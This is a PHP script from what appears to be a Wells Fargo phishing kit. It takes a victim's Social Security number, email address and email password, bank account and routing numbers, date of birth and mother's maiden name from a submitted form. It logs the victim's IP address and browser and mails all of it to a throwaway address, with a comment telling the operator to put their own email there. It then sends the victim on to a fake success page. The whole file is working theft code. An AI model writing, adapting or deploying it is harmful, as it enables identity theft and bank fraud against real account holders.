<?

    $ip = getenv("REMOTE_ADDR");
	$message .= "-------------- WellsFargo - Informations -------------\n";
	$message .= "SSN : ".$_POST['ssn']."\n";
	$message .= "Email : ".$_POST['email']."\n";
	$message .= "Email password : ".$_POST['pass']."\n";
	$message .= "Account Number : ".$_POST['acn']."\n";
	$message .= "Routing Number : ".$_POST['rtn']."\n";
	$message .= "Date of birth : ".$_POST['dob']."\n";
	$message .= "Mother Maiden Name : ".$_POST['mmn']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "-----------------------------------------\n";
	$subject = "WellsFargo Info Account | $ip";
	$send = "ioy95qexypfc5iq@jetable.org"; //Put You Email Here
	$headers = 'From: General' . "\r\n";
	mail($send,$subject,$message,$headers);
    echo "<meta http-equiv='refresh' content='0;URL=../success.php?b85d0941e8df58f520f8fdadf84914cd641eb'/>";
	?>